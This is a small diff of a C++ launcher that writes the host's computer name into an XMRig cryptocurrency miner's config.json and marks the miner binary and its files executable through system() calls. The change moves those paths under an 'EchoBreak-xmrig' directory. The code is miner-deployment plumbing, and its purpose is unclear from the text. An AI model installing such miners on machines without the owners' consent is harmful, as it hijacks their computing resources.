@@ -57,9 +57,9 @@ int main() {
     std::string filename = "xmrig-6.22.2/config.json";
     editFile(filename, compname);
 
-    system("chmod +x xmrig-6.22.2/xmrig");
-    system("chmod +x xmrig-6.22.2/SHA256SUMS");
-    system("chmod +x xmrig-6.22.2/config.json");
+    system("chmod +x EchoBreak-xmrig/xmrig-6.22.2/xmrig");
+    system("chmod +x EchoBreak-xmrig/xmrig-6.22.2/SHA256SUMS");
+    system("chmod +x EchoBreak-xmrig/xmrig-6.22.2/config.json");
   
     return 0;
 }
